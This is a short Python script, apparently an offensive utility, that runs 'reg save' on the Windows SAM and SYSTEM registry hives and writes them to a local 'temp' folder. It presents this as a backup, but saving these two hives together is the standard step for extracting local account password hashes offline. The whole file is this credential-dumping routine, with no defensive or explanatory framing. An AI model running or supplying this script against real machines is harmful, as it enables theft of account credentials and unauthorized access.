import subprocess
import os

def dump_registry_hives():
    print("[+] Backing up registry hives (requires admin)...\n")
    try:
        os.makedirs("temp", exist_ok=True)
        subprocess.call("reg save HKLM\\SAM temp\\sam.save /y", shell=True)
        subprocess.call("reg save HKLM\\SYSTEM temp\\system.save /y", shell=True)
        print("[+] Registry hives saved to 'temp/' folder.")
    except Exception as e:
        print("[-] Failed to save registry hives:", e)

if __name__ == "__main__":
    dump_registry_hives()
